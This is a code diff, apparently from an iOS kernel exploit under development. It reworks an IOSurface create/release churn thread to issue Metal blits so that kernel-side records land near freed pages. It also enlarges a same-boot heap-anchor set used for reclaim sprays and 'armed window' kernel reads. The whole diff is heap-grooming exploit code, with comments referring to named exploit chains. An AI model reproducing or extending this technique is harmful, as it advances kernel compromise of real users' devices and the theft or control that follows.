@@ -201,22 +201,69 @@ static void *rc_surf_churn_thread(void *arg) {
     CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, ck, cv, 3,
         &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     CFRelease(nw); CFRelease(nh); CFRelease(nb);
-    uint64_t cycles = 0;
+    /* v15 (2026-11-20): the FENCE-STYLE blit churn — the LightSword
+       connection. Pure create/release cycles churn the IOSurface zone but
+       generate NO kernel-side records; a Metal blit per surface generates
+       the IOSA activity events ({sid, metric} — the P130 family's proven
+       3072 writer) = actual kernel-side content near the freed pages. This
+       is the DarkSword diff's V3/V4 interleave lever + the receipt law
+       ("calib gets no hot offsets unless cskrw runs concurrently — we need
+       churn of the right KIND"). The receipt that named it: kr=0x5
+       (KERN_MEMORY_ERROR) at every armed window — the reads need live
+       kernel-side neighbors, and blits create them. */
+    static id<MTLDevice> blitDev = nil;
+    static id<MTLCommandQueue> blitQ = nil;
+    static MTLTextureDescriptor *blitTD = nil;
+    static dispatch_once_t onceTok;
+    dispatch_once(&onceTok, ^{
+        blitDev = MTLCreateSystemDefaultDevice();
+        if (blitDev) {
+            blitQ = [blitDev newCommandQueue];
+            blitTD = [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
+                                   width:64 height:64 mipmapped:NO];
+        }
+    });
+    uint64_t cycles = 0, blits = 0;
     while (rc_surfChurnGo) {
         for (int i = 0; i < 8 && rc_surfChurnGo; i++) {
             IOSurfaceRef s = pCr(props);
-            if (s) CFRelease(s);   /* alloc+free draw on the freed page */
+            if (s) {
+                if (blitQ && blitTD) {
+                    @autoreleasepool {
+                        id<MTLTexture> tex = [blitDev newTextureWithDescriptor:blitTD
+                                                              iosurface:s plane:0];
+                        if (tex) {
+                            id<MTLCommandBuffer> cb = [blitQ commandBuffer];
+                            if (cb) {
+                                id<MTLBlitCommandEncoder> be = [cb blitCommandEncoder];
+                                if (be) {
+                                    [be copyFromTexture:tex sourceSlice:0 sourceLevel:0
+                                        sourceOrigin:MTLOriginMake(0, 0, 0)
+                                        sourceSize:MTLSizeMake(32, 32, 1)
+                                        toTexture:tex destinationSlice:0 destinationLevel:0
+                                        destinationOrigin:MTLOriginMake(32, 0, 0)];
+                                    [be endEncoding];
+                                    [cb commit];
+                                    blits++;
+                                }
+                            }
+                        }
+                    }
+                }
+                CFRelease(s);   /* alloc+free draw on the freed page (kept) */
+            }
             cycles++;
         }
         usleep(25000);   /* 25 ms pacing — the watchdog law */
     }
     if (props) CFRelease(props);
-    rc_log("[v14] IOSurface churn stopped (cycles=%llu)", (unsigned long long)cycles);
+    rc_log("[v14] IOSurface churn stopped (cycles=%llu blits=%llu)",
+           (unsigned long long)cycles, (unsigned long long)blits);
     return NULL;
 }
 /* 2026-11-19 multi-anchor: the full same-boot set (m0 = [0]; the v14
    reclaim spray carries [1]). Classifiers exclude the whole set. */
-static uint64_t g_rcAnchors[4] = {0};
+static uint64_t g_rcAnchors[8] = {0};   /* 2026-11-20: 4 -> 8 (match the cs2_ctx set + the want=8 harvest) */
 static int g_rcAnchorN = 0;
 static BOOL rc_is_own_anchor(uint64_t q) {
     if (!g_rcAnchorN) return NO;
@@ -764,8 +811,10 @@ static CFNumberRef RCNUM(int64_t v) {
            own pages). fill = the same-boot REAL heap anchor when one
            exists (p159 first), else the per-boot hmarker. The anchor is
            excluded from every shape classifier below. */
-        int nAnc = LabHeapAnchorHarvestIfThin(1);   /* thin -> bounded p159 harvest (2x8 rounds) */
-        g_rcAnchorN = LabHeapAnchorsSameBoot(4, g_rcAnchors);
+        int nAnc = LabHeapAnchorHarvestIfThin(8);   /* 2026-11-20: want the FULL 8-set (the receipt law:
+                          "make sure all anchors actually get anchored, not just 2, 0" —
+                          the old want=1/2 stopped the harvest before the set filled) */
+        g_rcAnchorN = LabHeapAnchorsSameBoot(8, g_rcAnchors);
         g_rcAnchor = g_rcAnchorN ? g_rcAnchors[0] : 0;
         m0 = g_rcAnchor ? g_rcAnchor : hmarker;
         g_rcUntagged = (g_rcAnchor == 0);   /* bandit-arm bookkeeping only */
